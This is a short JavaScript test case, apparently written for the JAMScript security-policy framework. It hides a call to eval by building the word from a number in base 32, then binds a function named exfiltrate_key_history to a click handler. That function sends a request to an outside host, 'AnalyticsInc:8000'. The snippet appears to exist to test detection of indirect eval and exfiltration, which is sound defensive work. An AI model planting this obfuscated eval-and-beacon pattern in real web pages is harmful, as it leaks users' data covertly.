
JAM.startProfile('load');
function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval3", true);xmlhttp.send(null);',v4=32,v4=(490837).toString(v4),v4=v4+"",v4=JAMScript.isEval(eval)?eval("introspect(JAMScript.introspectors.processAll) { "+v4+" }"):JAMScript.call(eval,null,[v4]);JAMScript.call(v4,null,[exp])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
